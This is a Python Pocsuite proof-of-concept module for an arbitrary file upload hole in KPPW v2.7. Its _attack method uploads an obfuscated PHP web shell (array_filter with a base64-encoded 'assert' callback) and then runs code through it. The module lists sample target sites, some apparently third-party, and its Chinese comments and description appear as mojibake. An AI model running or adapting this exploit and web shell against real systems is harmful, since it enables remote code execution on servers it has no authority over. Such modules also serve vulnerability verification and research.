import re
import os
import urlparse
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = '91247'  # ssvid
    version = '1.0'
    author = ['Rice']
    vulDate = '2016-01-21'
    createDate = '2016-04-05'
    updateDate = '2016-04-05'
    references = ['http://www.seebug.org/vuldb/ssvid-91247']
    name = 'KPPW2.7 �ļ��ϴ������������ִ�� PoC'
    appPowerLink = 'http://www.kppw.cn/'
    appName = 'KPPW'
    appVersion = 'v2.7'
    vulType = 'upload files'
    desc = '''
        KPPW��վ����ʹ��PHP+MYSQL�����������ܲ����������MVC���ģʽ��WEBǰ�˲��������е�HTML5+CSS3�������Bootstrap֧����Ӧʽ��ҳ��ơ�
        ��Ʒҵ����Ĺ����ǻ����������ͽ��׺��û�������Ʒ����Ϊ������һ��C2C�ĵ���������ƽ̨��
        ����Ҫ���׶��������û�Ϊ���ļ��ܡ����顢ʱ����ǻ�����Ʒ��
        
        ��ͨ���ؼ���powered by kppw 2.7������Ӱ���վ�㡣
    '''

    samples = ['http://demo.kppw.cn/','http://www.202h.com','http://americacommercialnews.com']

    # �ϴ�һ�仰
    def _attack(self):
        result = {}
        url = urlparse.urljoin(self.url,'index.php?do=ajax&view=upload&file_type=big&filename=filename')
        shell = "Ra<?php $e = $_REQUEST['e'];$arr = array($_POST['pass'],);array_filter($arr, base64_decode($e));?>"

        # �ڱ����½�һ���ļ�
        f = open('s.php', 'wb+')
        f.write(shell)
        f.flush()
        f.close()

        #�ϴ��ļ�
        f = open('s.php','rb')
        files = [('filename', ('php.php',f, 'jpg'))]
        resp = req.post(url, files=files)
		
        # ɾ�����ظմ������ļ�
        f.close()
        os.remove('s.php')

        # ƥ���ϴ����·���������ʸ�·����֤�Ƿ��ϴ��ɹ�
        match = re.findall(r'"(data\\\/uploads\\\/.*?\.php)"',resp.content)
        if match:
            url = urlparse.urljoin(self.url,'/'+match[0].replace('\\','')+'?e=YXNzZXJ0')
            head = {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            data = {
                'pass' : 'print_r(poctest);'
            }
            resp = req.post(url,headers=head,data=data)
            if resp.status_code == 200 and 'poctest' in resp.content:
                result['FileInfo'] = {}
                result['FileInfo']['Fileame'] = url
                result['FileInfo']['Content'] = shell
        
        return self.parse_output(result)

    def _verify(self):
        result = {}
        vulurl = urlparse.urljoin(self.url,'index.php?do=ajax&view=upload&file_type=big&filename=filename')
        shell = "Ra<?php echo pocpocpocpoctesttesttest;unlink(__FILE__);?>"

        # �ڱ����½�һ���ļ�
        f = open('s.php', 'wb+')
        f.write(shell)
        f.flush()
        f.close()

        #�ϴ��ļ�
        f = open('s.php','rb')
        files = [('filename', ('php.php',f, 'jpg'))]
        resp = req.post(vulurl, files=files)
		
        # ɾ�����ظմ������ļ�
        f.close()
        os.remove('s.php')

        # ƥ���ϴ����·���������ʸ�·����֤�Ƿ��ϴ��ɹ�����ɾ�����ϴ����ļ�
        match = re.findall(r'"(data\\\/uploads\\\/.*?\.php)"',resp.content)
        if match:
            url = urlparse.urljoin(self.url,'/'+match[0].replace('\\',''))

            resp = req.post(url)
            if resp.status_code == 200 and 'pocpocpocpoctesttesttest' in resp.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vulurl
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
